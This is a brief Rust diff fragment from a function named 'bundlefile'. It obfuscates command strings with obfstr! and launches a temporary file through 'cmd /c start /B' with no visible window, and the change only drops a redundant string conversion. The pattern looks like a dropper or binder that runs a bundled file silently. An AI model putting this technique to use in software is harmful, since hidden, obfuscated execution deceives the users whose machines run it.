@@ -29,7 +29,7 @@ pub fn bundlefile() -> Result<(), Box<dyn std::error::Error>> {
 
     use std::process::Command;
     Command::new(obfstr!("cmd"))
-        .args(&[obfstr!("/c"), obfstr!("start"), obfstr!("/B"), temp_file_path.to_str().unwrap().to_string()])
+        .args(&[obfstr!("/c"), obfstr!("start"), obfstr!("/B"), temp_file_path.to_str().unwrap()])
         .creation_flags(CREATE_NO_WINDOW)
         .spawn()
         .map_err(|e| format!("Failed to open file: {}", e))?;
